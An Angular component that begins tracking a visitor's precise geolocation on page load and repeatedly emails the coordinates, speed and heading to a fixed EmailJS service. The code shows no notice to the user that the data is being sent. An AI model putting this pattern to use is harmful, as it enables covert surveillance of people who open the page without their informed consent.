import {Component, OnInit} from "@angular/core";
import {JsonPipe} from "@angular/common";
import emailjs from '@emailjs/browser';

@Component({
  standalone: true,
  selector: 'app-home',
  templateUrl: './home.component.html',
  imports: [
    JsonPipe
  ],
  styleUrls: ['./home.component.scss']
})

export class HomeComponent implements OnInit {

  timeOut = 1000 * 60 * 60;
  highAccuracy = true;
  showCurrentPosition = false;
  locationTracked: {} = {};
  geoWatch: number|null = null;
  sendTimeOut = 3000;

  ngOnInit() {
    this.getLocation();
  }

  getLocation() {
    if ("geolocation" in navigator) {
      this.showCurrentPosition ? this.currentPosition(navigator) : this.trackPosition(navigator);
    } else {
      console.error( "Geolocation not available." );
    }
  }

  switchTrackerType() {
    this.showCurrentPosition =!this.showCurrentPosition;
    this.getLocation();
  }

  stopWatch() {
    if (typeof this.geoWatch === "number") {
      navigator.geolocation.clearWatch(this.geoWatch);
    }
    this.geoWatch = null;
    this.locationTracked = {};
  }

  sendEmail() {
    const templateParams = {
      message: JSON.stringify(this.locationTracked)
    };
    emailjs.send(
      "service_x3814de",
      "template_xs7uj3t",
      templateParams,
      { publicKey: 'x3uWv521jGcngQKga' }
    ).then(
      (response) => {
        console.log('SUCCESS!', response.status, response.text);
      },
      (err) => {
        console.error('FAILED!', err);
      },
    );
  }

  currentPosition(navigator: any) {
    navigator.geolocation.getCurrentPosition( this.setCurrentPosition.bind(this), this.positionError.bind(this), {
      enableHighAccuracy: this.highAccuracy,
      timeout: this.timeOut,
      maximumAge: 0
    });
  }

  trackPosition(navigator: any) {
    if ( "watchPosition" in navigator.geolocation ) {
      this.geoWatch = navigator.geolocation.watchPosition( this.setCurrentPosition.bind(this), this.positionError.bind(this), {
        enableHighAccuracy: this.highAccuracy,
        timeout: this.timeOut,
        maximumAge: 0
      });
    }
  }

  setCurrentPosition( position: any ) {
    this.locationTracked = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      altitude: position.coords.altitude,
      altitudeAccuracy: position.coords.altitudeAccuracy,
      heading: position.coords.heading,
      speed: position.coords.speed
    };

    if (Object.keys(this.locationTracked).length) {
      setTimeout( () => {
        this.sendEmail();
      }, this.sendTimeOut);
    }
  }

  positionError( error: any ) {
    switch( error.code ) {
      case error.PERMISSION_DENIED:
        alert( "User denied the request for Geolocation." );
        break;
      case error.POSITION_UNAVAILABLE:
        alert( "Location information is unavailable." );
        break;
      case error.TIMEOUT:
        alert( "The request to get user location timed out." );
        break;
      case error.UNKNOWN_ERROR:
        alert( "An unknown error occurred." );
        break;
    }
  }
}
